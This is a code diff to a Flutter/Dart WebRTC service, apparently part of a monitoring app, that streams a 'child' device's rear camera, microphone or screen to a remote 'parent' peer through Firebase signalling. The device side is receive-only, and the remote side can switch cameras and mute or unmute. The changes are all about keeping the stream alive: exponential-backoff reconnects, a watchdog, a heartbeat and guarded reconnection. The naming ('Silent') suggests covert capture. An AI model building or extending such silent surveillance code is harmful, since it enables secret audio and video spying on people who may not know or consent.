@@ -1,25 +1,27 @@
 import 'dart:async';
+
+import 'package:firebase_database/firebase_database.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter_webrtc/flutter_webrtc.dart';
-import 'package:firebase_database/firebase_database.dart';
 
 class SilentWebRTCService {
   static SilentWebRTCService? _instance;
-  static SilentWebRTCService get instance =>
-      _instance ??= SilentWebRTCService._();
+  static SilentWebRTCService get instance => _instance ??= SilentWebRTCService._();
   SilentWebRTCService._();
 
   RTCPeerConnection? _pc;
   MediaStream? _localStream;
   bool _active = false;
+  bool _connecting = false;
   String? _activeUid;
   String? _activeMode;
   StreamSubscription? _offerSub, _candidateSub, _statusSub, _commandSub;
   bool _answerSet = false;
   int _reconnectAttempts = 0;
-  static const int _maxReconnectAttempts = 5;
+  static const int _maxReconnect = 7;
   Timer? _reconnectTimer;
   Timer? _watchdogTimer;
+  Timer? _heartbeatTimer;
   DateTime? _lastIceActivity;
 
   static const _ice = {
@@ -57,63 +59,46 @@ class SilentWebRTCService {
   }
 
   Future<void> _connect(String childUid) async {
+    if (_connecting) return;
+    _connecting = true;
     try {
+      // Tear down any previous connection
+      await _cleanupPcOnly();
       _pc = await createPeerConnection(_ice);
       _lastIceActivity = DateTime.now();
 
       _pc!.onIceConnectionState = (state) {
-        debugPrint('[SilentWebRTC] ICE state: $state');
+        debugPrint('[SilentWebRTC] ICE: $state');
         _lastIceActivity = DateTime.now();
         if (state == RTCIceConnectionState.RTCIceConnectionStateFailed ||
             state == RTCIceConnectionState.RTCIceConnectionStateDisconnected) {
-          if (_active && _reconnectAttempts < _maxReconnectAttempts) {
-            _scheduleReconnect(childUid);
-          }
-        }
-        if (state == RTCIceConnectionState.RTCIceConnectionStateConnected ||
-            state == RTCIceConnectionState.RTCIceConnectionStateCompleted) {
+          _scheduleReconnect(childUid);
+        } else if (state == RTCIceConnectionState.RTCIceConnectionStateConnected ||
+                   state == RTCIceConnectionState.RTCIceConnectionStateCompleted) {
           _reconnectAttempts = 0;
         }
       };
 
       _pc!.onConnectionState = (state) {
-        debugPrint('[SilentWebRTC] Connection state: $state');
-        if (state == RTCPeerConnectionState.RTCPeerConnectionStateFailed) {
-          if (_active && _reconnectAttempts < _maxReconnectAttempts) {
-            _scheduleReconnect(childUid);
-          }
+        debugPrint('[SilentWebRTC] Connection: $state');
+        if (state == RTCPeerConnectionState.RTCPeerConnectionStateFailed ||
+            state == RTCPeerConnectionState.RTCPeerConnectionStateClosed) {
+          _scheduleReconnect(childUid);
         }
       };
 
-      try {
-        if (_activeMode == 'screen') {
-          _localStream = await navigator.mediaDevices.getDisplayMedia({
-            'video': {'frameRate': 15, 'width': 720, 'height': 1280},
-            'audio': false,
-          });
-        } else {
-          _localStream = await navigator.mediaDevices.getUserMedia({
-            'video': {
-              'facingMode': 'environment',
-              'width': {'ideal': 640},
-              'height': {'ideal': 480},
-              'frameRate': {'ideal': 15, 'max': 30},
-            },
-            'audio': true,
-          });
-        }
-      } catch (e) {
-        debugPrint('[SilentWebRTC] Media error: $e, falling back to camera');
-        _localStream = await navigator.mediaDevices.getUserMedia({
-          'video': {'facingMode': 'environment', 'width': 640, 'height': 480},
-          'audio': true,
-        });
+      // Acquire media
+      _localStream = await _acquireMedia();
+      if (_localStream == null || !_active) {
+        _connecting = false;
+        return;
       }
 
       final tracks = _localStream!.getTracks();
       if (tracks.isEmpty) {
-        debugPrint('[SilentWebRTC] No tracks in stream — aborting');
+        debugPrint('[SilentWebRTC] No tracks — aborting');
         _active = false;
+        _connecting = false;
         return;
       }
       for (final t in tracks) {
@@ -123,33 +108,28 @@ class SilentWebRTCService {
       final db = FirebaseDatabase.instance.ref();
 
       _pc!.onIceCandidate = (c) {
-        if (c.candidate != null) {
-          db.child('calls/$childUid/childCandidates').push().set({
-            'candidate': c.candidate,
-            'sdpMid': c.sdpMid,
-            'sdpMLineIndex': c.sdpMLineIndex,
-          });
-        }
+        if (c.candidate == null || !_active) return;
+        db.child('calls/$childUid/childCandidates').push().set({
+          'candidate': c.candidate,
+          'sdpMid': c.sdpMid,
+          'sdpMLineIndex': c.sdpMLineIndex,
+        });
       };
 
       await db.child('calls/$childUid/childCandidates').remove();
       await db.child('calls/$childUid/answer').remove();
 
       _offerSub = db.child('calls/$childUid/offer').onValue.listen((e) async {
-        if (e.snapshot.value == null || _pc == null || _answerSet) return;
+        if (e.snapshot.value == null || _pc == null || _answerSet || !_active) return;
         try {
           final d = Map<String, dynamic>.from(e.snapshot.value as Map);
-          await _pc!.setRemoteDescription(
-              RTCSessionDescription(d['sdp'], d['type']));
+          await _pc!.setRemoteDescription(RTCSessionDescription(d['sdp'], d['type']));
           final ans = await _pc!.createAnswer({
             'offerToReceiveVideo': false,
             'offerToReceiveAudio': false,
           });
           await _pc!.setLocalDescription(ans);
-          await db.child('calls/$childUid/answer').set({
-            'sdp': ans.sdp,
-            'type': ans.type,
-          });
+          await db.child('calls/$childUid/answer').set({'sdp': ans.sdp, 'type': ans.type});
           _answerSet = true;
           debugPrint('[SilentWebRTC] Answer sent');
         } catch (ex) {
@@ -157,30 +137,26 @@ class SilentWebRTCService {
         }
       });
 
-      _candidateSub = db
-          .child('calls/$childUid/parentCandidates')
-          .onChildAdded
-          .listen((e) async {
-        if (e.snapshot.value == null || _pc == null) return;
+      _candidateSub = db.child('calls/$childUid/parentCandidates').onChildAdded.listen((e) async {
+        if (e.snapshot.value == null || _pc == null || !_active) return;
         try {
           final c = Map<String, dynamic>.from(e.snapshot.value as Map);
-          await _pc!.addCandidate(RTCIceCandidate(
-              c['candidate'], c['sdpMid'], c['sdpMLineIndex']));
+          await _pc!.addCandidate(
+              RTCIceCandidate(c['candidate'], c['sdpMid'], c['sdpMLineIndex']));
         } catch (_) {}
       });
 
       _commandSub = db.child('calls/$childUid/command').onValue.listen((e) async {
+        if (!_active) return;
         final cmd = e.snapshot.value as String?;
         if (cmd == 'flip') {
           final t = _localStream?.getVideoTracks() ?? [];
           if (t.isNotEmpty) {
             try { await Helper.switchCamera(t.first); } catch (_) {}
           }
-        }
-        if (cmd == 'mute') {
+        } else if (cmd == 'mute') {
           _localStream?.getAudioTracks().forEach((t) => t.enabled = false);
-        }
-        if (cmd == 'unmute') {
+        } else if (cmd == 'unmute') {
           _localStream?.getAudioTracks().forEach((t) => t.enabled = true);
         }
       });
@@ -193,25 +169,53 @@ class SilentWebRTCService {
       });
 
       _startWatchdog(childUid);
-      debugPrint('[SilentWebRTC] Streaming silently (mode: $_activeMode)');
+      _startHeartbeat(childUid, db);
+      debugPrint('[SilentWebRTC] Streaming (mode: $_activeMode)');
     } catch (e) {
       debugPrint('[SilentWebRTC] Connect error: $e');
-      if (_active && _reconnectAttempts < _maxReconnectAttempts) {
-        _scheduleReconnect(childUid);
-      } else {
-        _active = false;
+      _scheduleReconnect(childUid);
+    } finally {
+      _connecting = false;
+    }
+  }
+
+  Future<MediaStream?> _acquireMedia() async {
+    try {
+      if (_activeMode == 'screen') {
+        return await navigator.mediaDevices.getDisplayMedia({
+          'video': {'frameRate': 15, 'width': 720, 'height': 1280},
+          'audio': false,
+        });
       }
+    } catch (e) {
+      debugPrint('[SilentWebRTC] Screen capture failed, falling back: $e');
+    }
+    // Camera fallback (also used for camera mode)
+    try {
+      return await navigator.mediaDevices.getUserMedia({
+        'video': {
+          'facingMode': 'environment',
+          'width': {'ideal': 640},
+          'height': {'ideal': 480},
+          'frameRate': {'ideal': 15, 'max': 30},
+        },
+        'audio': true,
+      });
+    } catch (e) {
+      debugPrint('[SilentWebRTC] Camera acquisition failed: $e');
+      return null;
     }
   }
 
   void _scheduleReconnect(String childUid) {
+    if (!_active || _reconnectAttempts >= _maxReconnect) return;
     _reconnectTimer?.cancel();
     _reconnectAttempts++;
-    final delay = Duration(seconds: _reconnectAttempts * 3);
-    debugPrint('[SilentWebRTC] Reconnect attempt $_reconnectAttempts in ${delay.inSeconds}s');
+    // Exponential backoff: 2^n seconds (1, 2, 4, 8, 16, 32, 64)
+    final delay = Duration(seconds: 1 << (_reconnectAttempts - 1));
+    debugPrint('[SilentWebRTC] Reconnect #$_reconnectAttempts in ${delay.inSeconds}s');
     _reconnectTimer = Timer(delay, () async {
       if (!_active) return;
-      await _cleanupPcOnly();
       await _connect(childUid);
     });
   }
@@ -221,13 +225,21 @@ class SilentWebRTCService {
     _watchdogTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
       if (!_active) { _watchdogTimer?.cancel(); return; }
       if (_lastIceActivity != null &&
-          DateTime.now().difference(_lastIceActivity!) >
-              const Duration(seconds: 60)) {
-        debugPrint('[SilentWebRTC] Watchdog: no ICE activity, reconnecting');
-        if (_activeUid != null && _reconnectAttempts < _maxReconnectAttempts) {
-          _scheduleReconnect(_activeUid!);
-        }
+          DateTime.now().difference(_lastIceActivity!) > const Duration(seconds: 60)) {
+        debugPrint('[SilentWebRTC] Watchdog: stale ICE, reconnecting');
+        if (_activeUid != null) _scheduleReconnect(_activeUid!);
       }
+    });
+  }
+
+  void _startHeartbeat(String childUid, DatabaseReference db) {
+    _heartbeatTimer?.cancel();
+    _heartbeatTimer = Timer.periodic(const Duration(seconds: 25), (_) async {
+      if (!_active) { _heartbeatTimer?.cancel(); return; }
+      try {
+        await db.child('calls/$childUid/childPing').set(
+            DateTime.now().millisecondsSinceEpoch);
+      } catch (_) {}
     });
   }
 
@@ -236,23 +248,25 @@ class SilentWebRTCService {
     _statusSub?.cancel(); _commandSub?.cancel();
     _offerSub = null; _candidateSub = null;
     _statusSub = null; _commandSub = null;
+    _heartbeatTimer?.cancel(); _heartbeatTimer = null;
     _answerSet = false;
-    await _pc?.close();
+    try {
+      _localStream?.getTracks().forEach((t) => t.stop());
+      await _localStream?.dispose();
+    } catch (_) {}
+    _localStream = null;
+    try { await _pc?.close(); } catch (_) {}
     _pc = null;
   }
 
   Future<void> stopSilent() async {
-    _active = false; _activeUid = null; _activeMode = null;
-    _answerSet = false; _reconnectAttempts = 0;
-    _reconnectTimer?.cancel(); _watchdogTimer?.cancel();
-    _reconnectTimer = null; _watchdogTimer = null;
-    _offerSub?.cancel(); _candidateSub?.cancel();
-    _statusSub?.cancel(); _commandSub?.cancel();
-    _offerSub = null; _candidateSub = null;
-    _statusSub = null; _commandSub = null;
-    _localStream?.getTracks().forEach((t) => t.stop());
-    await _localStream?.dispose();
-    await _pc?.close();
-    _localStream = null; _pc = null;
+    _active = false;
+    _activeUid = null;
+    _activeMode = null;
+    _reconnectAttempts = 0;
+    _reconnectTimer?.cancel(); _reconnectTimer = null;
+    _watchdogTimer?.cancel(); _watchdogTimer = null;
+    await _cleanupPcOnly();
+    debugPrint('[SilentWebRTC] Stopped');
   }
 }
